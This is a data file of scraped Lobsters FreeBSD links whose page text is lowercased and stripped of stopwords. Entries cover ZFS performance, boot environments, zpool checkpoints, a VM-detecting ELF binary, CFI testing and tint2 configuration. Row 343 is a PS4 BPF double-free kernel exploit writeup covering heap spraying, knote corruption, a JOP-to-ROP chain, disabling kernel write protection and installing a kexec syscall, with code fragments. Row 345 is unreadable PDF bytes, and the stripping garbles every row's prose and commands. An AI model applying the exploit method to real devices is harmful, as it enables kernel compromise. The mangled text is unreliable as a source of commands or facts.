337,Lobsters,freebsd,FreeBSD,Visualizing ZFS Performance,https://www.ixsystems.com/blog/visualizing-zfs-performance/,visualizing zfs performance,visualizing zfs performance blog brendan gregg system performance flame graph truenas mseries one cpu cycle main ram access ssd storage access rotational disk access michael dexter senior analyst,visualizing zfs performance may blog many tool exist understand zfs performance challenge opportunity single table renowned performance engineer brendan gregg teach visualize relationship tier storage device architecting truenas freenas system brendan gregg worked closely zfs team sun microsystems later wrote definitive book unix system performance system performance book brendan examines dozen powerful performance analysis tool top dtrace plot result flame graph help establish baseline performance pinpoint anomaly recommend book enough want talk single chart might overlook example time scale system latency page brendan map latency one cpu cycle one second time continues mapping example element computing stack resulting relative time scale range one second cpu cycle millennium server reboot four essential point brendan scale zfs administrator deceptively simple chart provides majority need understand zfs performance challenge opportunity newer flashbased storage device like nvdimm nvme device found new truenas mseries bridge gap ssds system ram distinct performance tier remain let break one cpu cycle cpu cycle one fixed point reference performance given system truenas freenas system maintain surplus cpu power operating system service obvious primary consumer resource zfsbased storage system make effective use cpu resource le obvious way checksumming compressing decompressing encrypting data data integrity guarantee made zfs possible thanks modern cpu ability calculate validate data block checksum fly luxury available previous generation system cpu also used continuously compressing decompressing data reducing burden storage device yielding performance gain encryption performed cpu typically take form ssh network transfer ondisk data block encryption faster ssh encryption improves network performance replication transfer data encryption place equal greater burden storage system compression case cpubased acceleration compression decompression encryption allows storage device perform best thanks optimization data provided main ram access like cpu computer memory used operating system service also provides volatile form storage play key role zfs performance computer ram considered volatile content lost computer switched ram performs dramatically slower cpu also dramatically faster form persistent storage zfs us ram adaptive replacement cache arc essentially intelligent read cache data residing arc thus ram available faster persistent storage device provide cost zfs famous aggressively using ram good reason investing ram greatest investment make read performance ssd storage access sitting squarely ram spinning disk term performance ssds joined yetfaster nvme card memoryclass device like nvdimms flashbased device introduce persistent storage generally pale comparison ram raw speed stark difference performance come stark difference capacity price enlightening u fact highperformance yet costcompetitive storage stack compromise made several type storage device termed hybrid storage industry practice ssds practical foundation allflash array majority user like arc also supplement slower storage device ssd nvme card often used zfs separate log device slog boost performance synchronized writes nfs database result allflash write performance data quickly offloaded spinning disk take advantage capacity offloading take place every five second default little bit slog storage go long way read side level two arc typically ssd nvmebased read cache easily larger computer memory price serving data flash device clearly faster spinning disk slower ram note using mean cut back computer memory dramatically index along various zfs metadata still kept ram rotational disk access finally reach spinning disk high capacity disk astonishingly slow performance compared flash rambased persistent volatile storage tempting scoff relative performance hard disk low cost per terabyte guarantee role heavy lifter storage industry foreseeable future stanley kubrick hal computer movie correctly predicted future storage bunch adjacent chip long way era understanding relative performance ram flash rotating disk help choose right storage component zfs storage array highlyknowledgeable sale team ixsystems help quickly turn theory budget storage system need michael dexter senior analyst
338,Lobsters,freebsd,FreeBSD,BSDCan 2018 playlist,https://www.youtube.com/watch?v=y_F-8HijfOA&list=PLeF8ZihVdpFfkICtA2HFsZecdC28_mrQh,bsdcan playlist,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature michio honda paste fast end system networking netmap bsdcan youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature michio honda paste fast end system networking netmap bsdcan youtube
339,Lobsters,freebsd,FreeBSD,ZFS Boot Environments at PBUG,https://vermaden.wordpress.com/2018/07/30/zfs-boot-environments-at-pbug/,zfs boot environment pbug,zfs boot environment polish bsd user group http isgdbeadm managebe beadm beadm binsh howto freebsd zfs madness beadm loader beadm polish bsd user group august wheel system george nevilleneil update video available online http update zfs boot environment pbug bsd o foundation like uncategorized beadm boot environment freebsd hardenedbsd illumos pbug pool solaris zfs vermaden,today honored give talk zfs boot environment third polish bsd user group meeting invited download pdf slide http isgdbeadm finished talk video talk yet available online update post arises back though available solution managebe script could written scratch imitate beadm command solarisillumos system make use boot environment easier natural written small native freebsd beadm prototype posix binsh shell shared result work freebsd forum howto freebsd zfs madness thread help freebsd community beadm tool grown complete native freebsd zfs boot environment manager later even freebsd boot loader modifiedrewritten support selection zfs boot environment created beadm script attached pdf presentation explains following topic zfs boot environment useful use case address available unix world introduced available linux world alternative practical example beadm usage history tool used zfs boot environment management possibility time join next polish bsd user group meeting impressed presence lot bsd professional great attitude willing share idea experience like whole freebsd community next meeting organized august place usual europewarsaw wheel system headquarters special guest meeting would george nevilleneil person introduce update video available online video talk uploaded online available http unfortunately polish english subtitle available update zfs boot environment pbug article included bsd o foundation episode thanks mentioning eof like like loading related entry posted uncategorized tagged beadm boot environment freebsd hardenedbsd illumos pbug pool solaris zfs july vermaden
340,Lobsters,freebsd,FreeBSD,Running FreeBSD on the ARM64 VPS from Scaleway,https://community.online.net/t/freebsd-on-arm64/6678,running freebsd vps scaleway,thinking allowed newest snapshot freebsd silently creates partition persist across reboots recently fixed one remaining issue build openatticorg,thinking since yesterday signed account played around offering turn pretty great kvm boot uefi local virtio disk attached nbd junk required definitely run freebsd managed depenguinate running instance note would great scaleway offered official image instead reason unlike mounting additional volume allowed instance move running linux ramdisk using pivotroot whatever one disk spin instance ubuntu zesty ssh prepare system change root tmpfs apt install gdisk mount tmpfs tmpfs tmp cp r bin sbin etc dev root home lib run usr var tmp mkdir tmpproc tmpsys tmpoldroot mount devvda tmpoldroot mount makerprivate pivotroot tmp tmpoldroot dev proc sys run mount move oldroot done systemctl daemonreload systemctl restart sshd reconnect ssh second terminal note rm connection file use controlpersist ssh config exit old session kill old sshd process restart stop rest stuff using old disk pkill f notty sed ibak srefusemanualstart g libsystemdsystemdbusservice systemctl daemonreload systemctl restart dbus systemctl daemonreexec systemctl stop user ntp cron systemdlogind systemctl restart systemdjournald systemdudevd pkill agetty pkill rsyslogd check nothing touching oldroot lsof grep oldroot probably old dbusdaemon kill finally unmount old root overwrite hard disk memstick image umount r oldroot wget http xzcat dd ifdevstdin ofdevvda look newest snapshot copy paste july link reading future actually maybe use release instead fix gpt move secondary table end disk resize table important resize freebsd silently creates partition persist across reboots gdisk devvda x e w reboot might actually want hard reboot reason first reboot linux pressing anykey enter prompt loader hang console go esc menu choose local disk boot manager seems boot disk automatically freebsd efi loader reason recently fixed serial autodetection efi working correctly something get console output default fix run command boot loader command prompt set consolecomconsole efi boot ignore warning comconsole valid console since least one efi loader think valid set whole variable upd necessary next snapshot regular installation process asked partitioning choose shell manually add partition set root filesystem gpart add freebsdzfs l zroot zpool create r mnt mountpointnone atimeoff zroot devgptzroot zfs create canmountoff mountpointnone zrootroot zfs create mountpoint zrootrootdefault zfs create mountpointusr zrootrootdefaultusr zfs create mountpointvar zrootrootdefaultvar zfs create mountpointvarlog zrootrootdefaultvarlog zfs create mountpointusrhome zroothome zpool set bootfszrootrootdefault zroot exit example set zfs beadmcompatible layout allows use boot environment postinstall chroot shell fix configs like echo opensolarisload yes bootloaderconf echo console comconsole efi bootloaderconf echo vfszfsarcmax bootloaderconf sysrc zfsenableyes exit yeah reason loader load zfsko dependency opensolarisko automatically idk even desktop laptop reboot installed system set root ssh key auto configuration boot pkg pkg install curl curl http rawgithubusercontentcomscalewayimagetoolsmasterbasesoverlaycommonusrlocalbinscwmetadata usrlocalbinscwmetadata chmod x usrlocalbinscwmetadata echo binsh etcrclocal echo pathusrlocalbin path etcrclocal echo eval scwmetadata etcrclocal echo echo rootsshauthorizedkeys etcrclocal echo chmod rootsshauthorizedkeys etcrclocal echo ifconfig etcrclocal echo route add default etcrclocal mkdir run mkdir rootssh sh etcrclocal one remaining issue incoming tcp connection like ssh simply testing nc public address work see incoming packet tcpdump reply work perfectly least fix incoming tcp connection configure dhcp client change broadcast address echo interface supersede broadcastaddress etcdhclientconf killall dhclient dhclient random note keep mind current snapshot come debugging kernel default limit syscall performance lot might want build config genericnodebug also disable heavy malloc debugging feature running ln abort false junk false etcmallocconf yes storing config symlink reuse installer partition swap p thanks openatticorg good information linux pivotroot
341,Lobsters,freebsd,FreeBSD,ZFS Zpool Checkpoints,http://oshogbo.vexillium.org/blog/46/,zfs zpool checkpoint,polish bsd user group video blog video,march freebsd landed interesting feature called zpool checkpoint jump straight topic let take step back look another zfs feature called snapshot snapshot allows u create image single file system give u option modify data dataset without fear losing dataa good example use zfs snapshot upgrade database schema let u consider situation script change schema sometimes unable upgrade one transaction example attempt alter table update single transaction database dataset snapshot something go wrong simply rollback file system previous statethe problem snapshot work single dataset added dataset would nt able create snapshot would rollback operation changing attribute dataset change compression dataset rollback would need change manuallyanother interesting problem involves upgrading whole operating system upgrade system new zfs version start upgrading dataset kernel begin crash use freebsd doubt ever experience still rollback old kernel chance dataset stop working new kernel know use new featureszpool checkpoint solution problem instead taking single snapshot dataset take snapshot whole pool mean rollback data also metadata rewind checkpoint zfs property rolled back upgrade rolledback even creationdeletion dataset snapshot rolledbackzpool checkpoint introduced simple function creating checkpoint zpool checkpoint pool rollback state checkpoint remove checkpoint zpool import rewindtocheckpoint pool mount pool read rollback data zpool import readonlyon rewindtocheckpoint remove checkpointzpool checkpoint discard pool zpool checkpoint pool powerful feature need remember safety rule scrub work data nt checkpoint ca nt remove vdev checkpoint ca nt split mirror reguid work either create checkpoint one disk removed feature incredibly useful especially upgrading operating system need experiment additional data set speak polish additional information first polish bsd user group meeting opportunity give short talk feature find video talk slideshow would like offer thanks serapheim dimitropoulos developing feature kind sharing many intricacy interested knowing technical detail feature check serapheim blog video checkpoint
342,Lobsters,freebsd,FreeBSD,Writing a cross-platform ELF binary (2008),http://blog.codetastrophe.com/2008/12/writing-cross-platform-elf-binary.html,writing crossplatform elf binary,great article freebsd system call article google code project tiny elf file article,fun actually bored work came crazy idea writing crossplatform elf binary could run linux freebsd without linux compatibility module potentially unix sure time justified thinking would somehow easier writing portable c compiled different platform though retrospect looking excuse something bit weird early experiment making portable elf file nt going well trying run linux executable freebsd without linux compat harder thought first problem abi version elf header first byte padding elf header interpreted abi version freebsd linux set ignores value set freebsd recognizes brandelf l known elf type freebsd linux solaris refuse run elf type supposedly setting work linux compat library installed avoiding gave got idea could strip program basic better chance making work found great article making tiny elf file reduced problem define start instead mainmake exit system call without calling exit turn even bigger problem elf header making system call crossplatform freebsd system call use different calling convention argument passed stack instead register like linux fortunately making one system call exit setting register pushing value stack work platform something complicated requires system call could get messy rather quickly though final piece something useful found article describing using sldt instruction detect virtualization summary high low byte returned sldt instruction nonzero high probability running vm lot way detect virtualization sldt easy code wrote probably nonoptimal nt written much assembly least easy enough read anyway main assembly part including elf header etc program follows start mov eax system call exit mov ebx default return value sldt edx sldt detect vmware cmp dl first byte je jump end return cmp dh second byte je jump end return mov ebx otherwise set return value push ebx push return value arg onto stack push eax push syscall number onto stack int syscall interrupt give return value machine running vm otherwise using might return value nt execute properly run unix platform abi elf header set correctly though tested linux freebsd full assembly google code project direct download link since following tiny elf file article assembly includes elf header byte assembled build nasm f bin vmwaresmall vmwaresmallasm run linux asis need run brandelf freebsd vmwaresmall freebsd set abi byte make run afterwords still run linux
343,Lobsters,freebsd,FreeBSD,PS4 5.05 BPF Double Free Kernel Exploit Writeup,https://github.com/Cryptogenic/Exploit-Writeups/blob/master/FreeBSD/PS4%205.05%20BPF%20Double%20Free%20Kernel%20Exploit%20Writeup.md,bpf double free kernel exploit writeup,note similar bug interesting primarily exploitation also used system using berkeley packet filter vm attacker sufficient permission published freebsd folder found mistake suggestion improve clarity point either open issue repo reply tweet thanks introduction qwertyoruiopz assumption concurrently background driver kernel bpf device driver packet filter race condition heap spraying tale two free src poisoning allocator corrupting knotes summary src src exploit overview poor man smap jop explained rop v jop src faking knote src code execution creating space kstack preparing memcpy call fundamental setting size setting source setting destination calling memcpy exploit debugging kind summary fatal trap complication critical section patching kernel disabling write protection src installing syscall kexec src sony patch conclusion credit qwertyoruiopz flatz additional thanks theflow reference qwertyoruiopz detailed annotation qwertyoruiopz slide watson freebsd kernel cross reference marco ramilli rop jop wikipedia control register wikipedia critical section,note similar bug interesting primarily exploitation also used system using berkeley packet filter vm attacker sufficient permission published freebsd folder found mistake suggestion improve clarity point either open issue repo reply tweet thanks introduction welcome kernel exploit writeup month ago kernel vulnerability discovered qwertyoruiopz exploit released bpf involved crafting outofbounds oob write via useafterfree uaf due lack proper locking fun bug trivial exploit sony removed write functionality bpf exploit patched however core issue still remained lack locking similar race condition still exists bpf past go detail full source exploit found bug longer accessible however past firmware bpf driver finally blocked unprivileged process webkit longer open sony also introduced new security mitigation firmware prevent stack pointer pointing user space however go detail bit assumption assumption made reader knowledge writeup avid reader basic understanding memory allocator work specifically malloc free allocate deallocate memory respectively also aware device issued command concurrently one command could received another one processed via threading understanding c exploitation basic also helpful though necessarily required background section contains helpful information newer exploitation unfamiliar device driver various exploit technique heap spraying race condition feel free skip tale two free section already familiar material driver way application directly communicate operating system one system call kernel freebsd rest sonyimplemented another method something called device driver driver typically used bridge gap software hardware device usb drive keyboardmouse webcam etc though also used software purpose operation userland application perform driver sufficient permission interface opening instance one read write case issue complex command via ioctl system call handler command implemented kernel space important bug could exploited ioctl handler used privilege escalation straight typically privileged state driver often weaker point operating system attacker sometimes driver written developer nt understand kernel work driver older thus wise newer attack method bpf device driver take look around inside webkit sandbox find dev directory may seem like root device driver path lie many driver exposed directory rather one needed webkit operation part reason though bpf aka berkeley packet filter device exposed webkit sandbox also privilege open device rw odd system driver rootonly good reason want read refer previous writeup packet filter excerpt bpfwrite writeup since bug directly filter system important know basic packet filter filter essentially set pseudoinstructions parsed bpffilter ran packet received pseudoinstruction set fairly minimal allows thing like perform basic arithmetic operation copy value around inside buffer breaking bpf vm entirety far beyond scope writeup know code produced ran kernel mode readwrite access devbpf privileged reference opcodes bpf vm take race condition race condition occur two processesthreads try access shared resource time without mutual exclusion problem ultimately solved introducing concept mutex lock idea one threadprocess try access resource first acquire lock access unlock finished another threadprocess try access lock wait thread finished work fairly well used properly locking hard get right especially try implement finegrained locking performance one single instruction line code outside locking window could introduce race condition race condition exploitable one give attacker powerful bug work heap spraying process heap spraying fairly simple allocate bunch memory fill controlled data loop pray allocation nt get stolen underneath useful technique exploiting something useafterfree use get controlled data target object backing memory extension useful double free well stale reference use heap spray control data since object marked free allocator eventually provide u control memory even though something else still using unless something else already stolen pointer corrupts likely get system crash fun one factor add variance exploit typically smaller object likely happen tale two free via ioctl command user set filter program given descriptor via command biosetwf command set filter however write filter one interesting u writeup important part previous exploit power free older filter new one allocated via bpfsetf called directly biosetwf command handler allowed u free filter use free also bug exploited leveraged newer exploit let take look bpfsetf src static int bpfsetf struct bpfd struct bpfprogram fp ulong cmd struct bpfinsn fcode old cmd biocsetwf old bdwfilter nt locked wfilter fp bfinsns null bpfdlock bpfdunlock old null free caddrt old mbpf return see variable stack hold filter pointer including one old filter eventually get free ioctl command set biosetwf pointer bdwfilter copied old stack variable later see lock bpf descriptor null reference filter lock reference clearing pointer bdwfilter copied stack seen previous exploit multiple thread run use bpfd object race setting two filter parallel chance thread copy pointer kernel stack eventually resulting double free pointer processed poisoning allocator double free primitive ability achieve memory corruption kernel heap poisoning memory allocator essentially allows u create targetted useafterfree uaf object allocated postcorruption corrupting knotes summary similar target object exploit used knote object kqueue object represent event queue raising event knote list managed kqueue knote object used represent kernel event memory linked together singly linked list qwerty chose knote knote list called knlist give u degree control size let take look structure macro ommited brevity sake src struct knote slistentry knote knlink kq slistentry knote knselnext struct selinfo struct knlist knknlist fattach populated tailqentry knote kntqe struct kqueue knkq queue struct kevent knkevent int knstatus protected kq lock int knsfflags saved filter flag intptrt knsdata saved data field union struct file pfp file data pointer struct proc pproc proc pointer struct aiocblist paio aio job pointer struct aioliojob plio lio job pointer knptr struct filterops knfop interest attacker offset void knhook int knhookid interesting field struct filterops knfop offset essentially table function pointer referenced something happens event attach detach fdetach function pointer dereferenced called kqueue extension knote destroyed src struct filterops int fisfd int fattach struct knote kn void fdetach struct knote kn int fevent struct knote kn long hint void ftouch struct knote kn struct kevent kev ulong type corrupting fdetach function pointer hijacking instruction pointer thus arbitrary code execution achieved object destroyed via destruction corrupted kqueue exploit overview exploit strategy targetting uaf knote object hijack instruction pointer let break stepsstages successful exploitation open bpf descriptor setup one nop filter one filter heap spraying setup fake knote object webkit heap jop setup kernel rop chain start thread one start thread two thread following action create kqueue via syskqueue set filter device attempt poison allocator trigger kevent perform heap spray attempt achieve memory corruption close kqueue attempt achieve code execution thread simply continously attempt set write filter poor man smap point seems sony added mitigation scheduler check stack pointer userland address running kernel context similar increasingly common supervisor mode access prevention smap mitigation found modern system turned otherwise fairly trivial exploit complex kernel memory manipulation run kernel rop krop chain knowledge nt investigated much attempting simple stack pivot like done previous exploit userland memory crash kernel avoid need get rop chain kernel memory qwerty decided go method used iphone essentially using jop push bunch stack frame onto kernel stack memcpy ing chain rsp find detailed annotation exploit assist understanding get quite complex jop explained software engineer started getting wise stack pivot technique preventing attacker ability stack pivot usercontrolled memory pretty decent countermeasure however like everything bypassable jop jump oriented programming way could use jop implement full chain use method getting rop via getting rop chain kernel memory latter preferred implementing logic jop possible nightmare rop v jop return oriented programming rop essentially process creating fake stack pushing address gadget pivotting rsp chain gadget executed like real callstack every time ret instruction hit next gadget chain run jump oriented programming jop work bit differently instead ending gadget ret instruction end gadget jmp instruction long control destination maybe register influence value chain gadget without need using fake stack instance control value rax gadget end jmp rax setting value rax address next gadget chain jop generally get creative even limited potential gadget implementing full chain jop preferred src faking knote covered basic exploit basic jop start process exploiting bug first thing need setup fake knote object spray heap luckily faking object easy need fake bunch member stability need fake member along knfops target object ctxp buffer used setup fake knote var ctxp ctxp knote knlink important kqueue per se jop gadget knstatus clear flag detach called knfops notice set knfops buffer fake knfops function table thing need fake table knfops fdetach function called kqueue destruction var knote knfops offsettowebkit jop gadget see achieve arbitrary code execution directing rip webkit snippet relevant code kqueueclose control instruction pointer achieved src note ctxp test byte ptr set good jnz short irrelevant mov rax mov rdi rdi call qword ptr jop gadget also notice control rdi register via register normal circumstance knote object kn loaded rdi first argument kn knfop fdetach however corruption knote control jump also argument important jop next jump first jop gadget requires u control rdi register code execution creating space kstack push space stack use jop chain use variable stackshiftfromretaddr track much pushed stack first run function prologue subtract rsp creating space u put rop chain function prologue first jop gadget setup previously fake knote sprayed sub rsp mov edx mov rdi mov rsi mov rax call qword ptr implicitly sub rsp point away original stack pointer remember jop work need able control code jump next mean control rax luckily see rax loaded set rdi detailed corruption rdi via knote object look previous section jop gadget called kernel set rdi next gadget called set offsettowebkit mov rdi jmp qword ptr rax gadget allow u set rdi new value jump rax still equivalent address notice gadget allows u loop write first gadget set first gadget jump via rdi var iterbase var loop time iterbase offsettowebkit first jop gadget stackshiftfromretaddr offsettowebkit second jop gadget iterbase setup next loop preparing memcpy call fundamental created space stack want copy kernel rop chain get executed let take look memcpy function signature void memcpy void destination const void source sizet num defined abi application binary interface following register used pas argument function rdi first argument rsi second argument rdx third argument rcx fourth argument fifth argument sixth argument stack seven argument therefore following register interesting u memcpy call rdi memory destination pointer rsi memory source pointer rdx size byte setting size first thing load rdx size via another jop gadget webkit mov rdx call qword ptr write relative rdi via rdibase variable adding shift plus offset writing stack load rdx chain length setting source next load source pointer rsi want point writing kernel rop chain userland similar set size look jop gadget set rsi memory relative rdi webkit trick mov rsi mov rdi mov rax rdi call qword ptr setting destination finally need setup rdi point fake stack frame pushed kernel stack turn rbp base pointer use another jop gadget lea rdi call qword ptr calling memcpy argument setup need call memcpy notice last jop gadget next place jump setup based rax want write address memcpy userland skip function prologue optimization avoid sideeffects produced previous jop gadget skip prolog covering side effecting branch skipping optimization var topofchain stackshiftfromretaddr topofchain exploit debugging kind summary suggested include section containing detail complication occured already detailed one smaplike implementation however another lack debugging point time nt kernel debugging framework setup working however ability patch kernel enable uart verbose panic information existing kernel exploit working course though system reboots longer access uart verbose panic info even fatal trap panic information printed kloguart helpful tool debugging exploit probably sony disabled first place example standard page fault panic klog fatal trap page fault kernel mode cpuid apic id fault virtual address fault code supervisor read instruction protection violation instruction pointer stack pointer frame pointer code segment base limit type dpl pres long gran processor eflags interrupt enabled resume iopl current process infloopthr see information extremely useful especially virtual address instruction pointer complication information fantastic system actually give u however case system wo nt often seems crash happens critical section inside free directly information critical section see critical section time reason nt get information unknown panic information unobtainable u either nt existing exploit information wo nt get printed klog trick must used using infloop gadget hacky exploit debugging technique patching kernel disabling write protection ability run kernel rop chain due stack manipulation sorcery described last section apply kernel patch disable kernel write protection via register flipping writeprotection bit bit src kroppush windowgadgets pop rsi kroppush new flip wp bit kroppush windowgadgets rax rsi kroppush windowgadgets mov rdx rax installing syscall kexec brevity sake wo nt cover patch detail however brief recap patch made rop chain syssetuid syscall remove permission check sysmmap syscall allow rwx mapping syscall instruction allowed anywhere sysdynlibdlsym syscall allow dynamic resolving anywhere main goal chain install system call called kexec allow u execute arbitrary code kernel mode easily application matter privilege syskexec void code void uap code jailbreaking hen ran via kexec installing fairly easy add entry sysent src struct sysent system call table int synarg number argument sycallt sycall implementing function aueventt syauevent audit event associated syscall systraceargsfunct sysystraceargsfunc optional argument conversion function syentry dtrace entry id systrace syreturn dtrace return id systrace syflags general flag system call sythrcnt setting sycall jmp qword ptr rsi gadget found kernel offset synarg syflags sythrstatic successfully insert custom system call executes code dq syscall dq dq dq dq dq sony patch real patch sony patch though time effective opening bpf blocked unprivileged process webkit appsgames still present sandbox however attempting open fail yield eperm conclusion another cool bug exploit trivial exploit however sony new mitigation prevents exploit devs pivotting rsp userland memory kernel context quite effective trick used get chain kernel memory demonstrated beatable exploit also good example double free exploited fairly easily freebsd object decent size credit qwertyoruiopz flatz additional thanks theflow suggestion feedback reference qwertyoruiopz detailed annotation qwertyoruiopz slide watson freebsd kernel cross reference marco ramilli rop jop wikipedia control register wikipedia critical section
344,Lobsters,freebsd,FreeBSD,Preliminary Call-For-Testing: Cross-DSO CFI,https://hardenedbsd.org/article/shawn-webb/2018-07-16/preliminary-call-testing-cross-dso-cfi,preliminary callfortesting crossdso cfi,introduction known issue limitation procedure testing binary update future work appendix hbsdupdateconf,past year hardenedbsd hard work integrating crossdso cfi implementation llvm reached point release early prealpha public call testing cft work reason described recommend cft used using rootonzfs boot environment recommend testing dedicated boot environment initial round testing best suited development server installation production server desktopslaptops advised testing time looking feedback work nt work introduction control flow integrity cfi exploit mitigation aim make harder attacker hijack control flow executable image llvm cfi implementation provides forwardedge protection meaning protects call site nonreturn code branch llvm includes basic incomplete backwardedge protection via safestack cfi llvm consists two flavor noncrossdso cfi crossdso cfi year hardenedbsd adopted noncrossdso cfi support noncrossdso cfi added july noncrossdso cfi applies cfi application shared object depend crossdso cfi applies cfi application shared object enforcing cfi across shared object boundary application shared object compiled source file typically get compiled first intermediate object file enabling crossdso cfi requires compiling linking static shared library link time optimization lto lto enabled object file longer elf object file rather llvm ir bitcode object file linking application compiled lto generally requires ldlld linker linking library compiled lto requires switching certain compiler toolchain component one understand llvm ir bitcode prepare crossdso cfi switched ar ranlib nm objdump respective llvm compiler toolchain component give u ability use lto acrosstheboard hardenedbsd userland exception note crossdso cfi requires storing metadata regarding shared library boundary runtime crossdso cfi requires aslr pax noexec minimum effective attacker know address metadata page attacker first perform dataonly attack later code executioncode reuse attack similarily attacker able mark nonexecutable yet writable page executable still obeying cfi example jit compiled code attacker still gain perform executioncode reuse attack known issue limitation known issue dive testing procedure would like talk bit known regression note list known issue essentially also constitutes workinprogress every known issue fixed prior official launch crossdso cfi seems llvm like statically compiling application lto mixture c c code sbindevd one application crossdso cfi enabled devd compiled positionindependent executable pie break ufs system usr separate partition currently looking solving issue allow devd statically compiled noshared unset tool build stage aka bootstraptools crosstools related static compilation issue unsetting noshared tool build stage bandaid resolve static compliation lto one goal crossdso cfi integration work able support cfiicall scheme dlopen dlsym dlfunc used mean runtime linker rtld must enhanced know care cfi runtime enhancement currently implemented planned crossdso cfi enabled safestack disabled compiling crossdso cfi brings second copy sanitizer runtime violating one definition rule odr resolving issue straightforward unify sanitizer runtime single common library crossdso cfi safestack link jun libpmc friend receiving lot code churn upstream freebsd jevents application liblibpmcpmuevents used build tool generate code enabling crossdso cfi disables building pmcrelated tool libpmc friend due jevents application segfaulting build process installed world crossdso cfi enabled performing buildworld crossdso cfi disabled fails somewhat related static compilation issue described linking crossdso cfi cause lld use extremely large amount memory parallel build job budget around memory linker due issue discussed cft applicable user either use zfs usr contained within root filesystem procedure testing use git clone locally hardenedbsd playground repo instruction assume using usrsrc location source tree also blow away existing source tree exists want keep existing source tree feel free modify step liking due complexity building crossdso cfi buildworld step must completed twice without crossdso cfi second time noncrossdso cfi world must installed prior performing second build noted work ensure nt need happen later instruction make following assumption root filesystem zfs proper layout zfs boot environment beadm package installed existing installation running cd usr rm rf src git clone http githubcomhardenedbsdhardenedbsdplaygroundgit src cd src git checkout b hardenedcurrentcrossdsocfi originhardenedcurrentcrossdsocfi make sj sysctl n hwncpu buildworld buildkernel beadm create beadm mount tmpnewbe make installworld installkernel destdirtmpnewbe mergemaster ifud tmpnewbe beadm umount beadm activate shutdown r binary update provide binary update base hardenedcurrentcrossdsocfi feature branch work get merged hardenedcurrentmaster take look appendix sample hbsdupdateconf configuration file crossdso cfi work future work done yet still plenty work upmost importance fixing static compilation lto enabled without staticallylinked application crash devd go back staticallylinked application user usr separate nonzfs filesystem able take advantage crossdso cfi secondly need reintegrate safestack giving u backwardedge protection third integration rtld without still need disable cfiicall scheme application make use dlopen dlsym dlfunc given uncharted territory likely find issue keep community updated informed issue resolved work integration port need ensure buildworld work various cfi mkcfi mkcrossdsocfi option toggled regardless installed world state given tremendous memory requirement hardenedbsd may able apply crossdso cfi across entire package repository current package building system dual xeon system eight core per cpu sixteen core total ram swap without crossdso cfi building package repo take around hour complete using sixteen core crossdso cfi enabled package build server eventually run swap using eight sixteen core though plan support crossdso cfi primary development platform major issue worked sanitizer framework need updated take freebsdhardenedbsd account july llvm sanitizer framework support time plan change hardenedbsd may well first unixlike operating system full crossdso cfi integration across entire base operating system userland appendix hbsdupdateconf hbsdupdateconf configuration setting hbsdupdate file read binsh shell us syntax dnsrec dns txt record use looking version info latest update record name seems redundant provides following information architecture branch hardenedcurrentmaster reverse form repo hardenedbsd dnsrec uname crossdsocficurrenthardenedhardenedbsdplaygroundupdateshardenedbsdorg kernel kernel install default intelligently detected parsing uname v output kernel hardenedbsd capath location trusted root certificate store capath usrsharekeyshbsdupdatetrusted branch branchtag pointing option used file baseurl option branch hardenedcurrentcrossdsocfi baseurl get update baseurl http updateshardenedbsdorgpubhardenedbsdplaygroundupdates branch uname dnssec use dnssec validating dns txt record default yes dnssec
345,Lobsters,freebsd,FreeBSD,Battle of the Schedulers: FreeBSD ULE vs. Linux CFS,https://www.usenix.org/system/files/conference/atc18/atc18-bouron.pdf,battle scheduler freebsd ule v linux cf,,obj stream e sq ju u dasjn l b x c j l zm zm p띆é r vl к al uڴ oz z v㒾 taޱk e e z zi p zńg e g q u e kr ǫznߊ w c g e r x r k kp iz
346,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 14 - Configuration - Tint2,https://vermaden.wordpress.com/2018/07/11/freebsd-desktop-part-14-configuration-tint2/,freebsd desktop part configuration,freebsd desktop global page feature right mouse button middle mouse button left mouse button leftmiddleright mouse button tint appstargz apps cat general autohide tooltip mouse panel launcher taskbar task systray desktop icon xinitrc xsession xinitrc xsession icon wm desktop apps icon icon apps xinitrc xsession grep tint xinitrc doas vuk wheel operator network doas sudo pkg install doas pw groupmod wheel vuk pw groupmod operator vuk pw groupmod network vuk cat usrlocaletcdoasconf script scriptsnfssh targz github chmod x script script path xinitrc path script echo scriptsstats basename mkdir p scriptsstats wc l scriptsstats sort n dependency pkg pkg install caja chromium deadbeef firefox galculator midori geany gimp leafpad xterm thunar xkill transmissiongtk thunderbird feh pidgin like,today article freebsd desktop series focus task bar configuration describe setup may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content feature task bar role served providing following feature launcher used application show openedminimized window four virtual desktop indicate current used virtual desktop provide system tray area application depend maximize selected window right mouse button close selected window middle mouse button focus selected window along switching virtual desktop window using left mouse button pas leftmiddleright mouse button event openbox window manager clicked object provide button set various cpu frequency left lowmediumhigh provide button set new random wallpaper task bar would look like action along previously configured status bar tint light solution one lightest know nice looking effective rare fusion feature appstargz tarball apps directory file achieve described earlier feature use following configuration file cat general rounded borderwidth backgroundcolor bordercolor autohide autohide strutpolicy minimum tooltip tooltip mouse mousemiddle close mouseright maximizerestore panel wmmenu panelitems lts panelmonitor panelposition top center panelsize panelmargin panelpadding panellayer bottom panelbackgroundid fontshadow launcher launcherpadding launcherbackgroundid launchericonsize launcheritemapp homevermadenappscajadesktop launcheritemapp homevermadenappsthunardesktop launcheritemapp homevermadenappsnfsdesktop launcheritemapp homevermadenappsterminaldesktop launcheritemapp homevermadenappsgeanydesktop launcheritemapp homevermadenappsleafpaddesktop launcheritemapp homevermadenappspidgindesktop launcheritemapp homevermadenappsthunderbirddesktop launcheritemapp homevermadenappsfirefoxdesktop launcheritemapp homevermadenappschromiumdesktop launcheritemapp homevermadenappsgimpdesktop launcheritemapp homevermadenappsgalculatordesktop launcheritemapp homevermadenappsdeadbeefdesktop launcheritemapp homevermadenappstransmissiondesktop launcheritemapp homevermadenappscpuldesktop launcheritemapp homevermadenappscpumdesktop launcheritemapp homevermadenappscpuhdesktop launcheritemapp homevermadenappswallpaperdesktop taskbar taskbarmode multidesktop taskbarpadding taskbarbackgroundid taskbaractivebackgroundid taskbardistributesize taskbarname taskbarnamefont ubuntu mono taskbarnamefontcolor aaaaaa taskbarnameactivefontcolor task taskicon tasktext taskwidth taskcentered taskpadding taskbackgroundid taskactivebackgroundid taskiconifiediconasb systray systray systraypadding systrayiconsize desktop file support relative directory icon parameter need replaced start xinitrc file xsession file similarly like openbox file already following openbox findreplace xinitrc file xsession file icon wm sed e home home user g configopenboxmenuxml sed e home home user g configopenboxrcxml add rule needed desktop file apps directory icon sed e home home user g icon apps apps 